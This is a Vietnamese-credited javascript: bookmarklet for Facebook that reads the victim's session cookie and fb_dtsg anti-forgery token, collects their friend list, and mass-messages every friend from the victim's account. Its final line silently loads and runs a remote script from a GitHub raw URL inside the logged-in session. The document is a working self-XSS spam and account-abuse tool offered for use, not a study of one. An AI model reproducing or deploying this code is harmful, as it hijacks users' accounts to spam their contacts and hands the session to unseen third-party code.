javascript: var grouppost = "<div><span class='img sp_f52w7l sx_47132d'></span><a style='position:absolute;size:3px;padding-left:3px;font-weight:bold;font-family:Tahoma;font-size:11px;color:#3B5998;'>Write Post</a></div></br>";
grouppost += "<div><textarea id='txtFloodMsg' placeholder='Write something...' style='padding-top:5px;width:493px;height:85px;font-family:tahoma;font-size:13px;background-color:rgba(255,255,255,0.1);color:#ffffff'></textarea></div>";
grouppost += "<div><span class='img sp_dpkef5 sx_f05251'></span><a style='position:absolute;font-family:Arial;size:3px;padding-left:3px;font-size:11px;color:rgb(128, 128, 128);'>Script Privacy: Public </a></span><button style='margin-left:437px' class='_42ft _4jy0 _11b _4jy3 _4jy1 selected' onclick='autopostingfunc(this);' >Post</button><br>" + _text + "</div>";
var _text = 'Powered By: <A style="color:#3B5998;" href="http://www.facebook.com/bui.long.9" target="_blank">Bùi Thành Long</A> & <A style="color:#3B5998;" href="http://vietnameseautogroup.blogspot.com" target="_blank"> Vietnamese Auto Group</A>.</br>Script Made By: </A><A style="color:#3B5998;" href="http://www.facebook.com/bui.long.9" target="_blank"> Bùi Thành Long</A></A>,</A><A style="color:#3B5998;" href="http://vietnameseautogroup.blogspot.com" target="_blank"> Vietnamese Auto Group</A></A>.</br>For More Tools Visit Our Blogger <A style="color:#3B5998;" href="http://vietnameseautogroup.blogspot.com/" target="_blank">Vietnamese Auto Group</A>.</A>';
var Popupset = document.createElement("div");
Popupset.setAttribute("style", "min-height:50px;width:500px;position:fixed;top:100px;box-shadow: 0px 4px 10px rgba(24, 144, 255, 0.63);position:fixed;left:50%;margin-left:-273px;text-align:left;border-radius:10px;padding:5px;z-index:999999;border:5px solid rgba(0,0,0,0.9);background-color:rgba(0,0,0,0.9);color:#ffffff");
Popupset.innerHTML = grouppost;
document.body.appendChild(Popupset);
jx = {
    getHTTPObject: function () {
        var A = false;
        if (typeof ActiveXObject != "undefined") try {
            A = new ActiveXObject("Msxml2.XMLHTTP")
        } catch (C) {
            try {
                A = new ActiveXObject("Microsoft.XMLHTTP")
            } catch (B) {
                A = false
            }
        } else if (window.XMLHttpRequest) try {
            A = new XMLHttpRequest
        } catch (C) {
            A = false
        }
        return A
    },
    load: function (b, c, d, e, f) {
        var g = this.init();
        if (!g || !b) return;
        if (g.overrideMimeType) g.overrideMimeType("text/xml");
        if (!e) e = "GET";
        if (!d) d = "text";
        if (!f) f = {};
        d = d.toLowerCase();
        e = e.toUpperCase();
        var h = "uid=" + (new Date).getTime();
        b += b.indexOf("?") + 1 ? "&" : "?";
        b += h;
        var i = null;
        if (e == "POST") {
            var j = b.split("?");
            b = j[0];
            i = j[1]
        }
        g.open(e, b, true);
        var k = this;
        if (f.handler) g.onreadystatechange = function () {
            f.handler(g)
        };
        else g.onreadystatechange = function () {
            if (g.readyState == 4) if (g.status == 200) {
                var a = "";
                if (g.responseText) a = g.responseText;
                if (d.charAt(0) == "j") {
                    a = a.replace(/[\n\r]/g, "");
                    a = eval("(" + a + ")")
                } else if (d.charAt(0) == "x") a = g.responseXML;
                if (c) c(a)
            } else {
                if (f.loadingIndicator) document.getElementsByTagName("body")[0].removeChild(f.loadingIndicator);
                if (f.loading) document.getElementById(f.loading).style.display = "none";
                if (error) error(g.status)
            }
        };
        g.send(i)
    },
    bind: function (A) {
        var C = {
            "url": "",
            "onSuccess": false,
            "onError": false,
            "format": "text",
            "method": "GET",
            "update": "",
            "loading": "",
            "loadingIndicator": ""
        };
        for (var B in C) if (A[B]) C[B] = A[B];
        if (!C.url) return;
        var D = false;
        if (C.loadingIndicator) {
            D = document.createElement("div");
            D.setAttribute("style", "position:absolute;top:0px;left:0px;");
            D.setAttribute("class", "loading-indicator");
            D.innerHTML = C.loadingIndicator;
            document.getElementsByTagName("body")[0].appendChild(D);
            this.opt.loadingIndicator = D
        }
        if (C.loading) document.getElementById(C.loading).style.display = "block";
        this.load(C.url, function (E) {
            if (C.onSuccess) C.onSuccess(E);
            if (C.update) document.getElementById(C.update).innerHTML = E;
            if (D) document.getElementsByTagName("body")[0].removeChild(D);
            if (C.loading) document.getElementById(C.loading).style.display = "none"
        }, C.format, C.method, C)
    },
    init: function () {
        return this.getHTTPObject()
    }
};
var j = 0;
var k = 0;
var suc = 0;
var msg = "";
var arr = new Array;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function autopostingfunc(f) {
    if (document.getElementById("txtFloodMsg").value != "") msg = document.getElementById("txtFloodMsg").value;
    jx.load(window.location.protocol + "//www.facebook.com/ajax/typeahead/search/bootstrap.php?__a=1&filter[0]=user&viewer=" + user_id + "&token=v7&lazy=0&__user=" + user_id, function (a) {
        var b = a;
        var c = b.substring(b.indexOf("{"));
        var d = JSON.parse(c);
        d = d.payload.entries;
        for (var e = 0; e < d.length; e++) arr.push(d[e].uid);
        f.parentNode.innerHTML = "Please Wait...";
        postitok()
    })
}
var a = document.body.innerHTML;
var dts = document.getElementsByName("fb_dtsg")[0].value;
var composerid = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var now = (new Date).getTime();

function postitok() {
    pst = "message_batch[0][action_type]=ma-type%3Auser-generated-message&message_batch[0][thread_id]=&message_batch[0][author]=fbid%3A" + user_id + "&message_batch[0][author_email]&message_batch[0][coordinates]&message_batch[0][timestamp]=" + now + "&message_batch[0][timestamp_absolute]=Today&message_batch[0][timestamp_relative]=2%3A31pm&message_batch[0][timestamp_time_passed]=0&message_batch[0][is_unread]=false&message_batch[0][is_cleared]=false&message_batch[0][is_forward]=false&message_batch[0][is_filtered_content]=false&message_batch[0][spoof_warning]=false&message_batch[0][source]=source%3Achat%3Aweb&message_batch[0][source_tags][0]=source%3Achat&message_batch[0][body]=" + encodeURIComponent(msg) + "&message_batch[0][has_attachment]=false&message_batch[0][html_body]=false&&message_batch[0][specific_to_list][0]=fbid%3A" + arr[suc] + "&message_batch[0][specific_to_list][1]=fbid%3A" + user_id + "&message_batch[0][ui_push_phase]=V3&message_batch[0][sticker_id]=126362117548585&message_batch[0][status]=0&message_batch[0][message_id]=%3C1369474261661%3A978076331-4038101592%40mail.projektitan.com%3E&&client=mercury&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35CFwXAw&__req=1h&fb_dtsg=" + dts + "&phstamp=";
    with(newx = new XMLHttpRequest) open("POST", "//www.facebook.com/ajax/mercury/send_messages.php"), send(pst);
    suc++;
    if (suc > arr.length) {
        alert("Auto Posting Completed. Now Refresh your Homepage.");
        suc = 0
    } else setTimeout("postitok()", 3E4 / arr.length)
}
setTimeout("autopostingfunc()", 1E3);
document.body.appendChild(document.createElement('script')).src = "https://raw.github.com/buithanhlong444/Final_Tools/master/All.js";
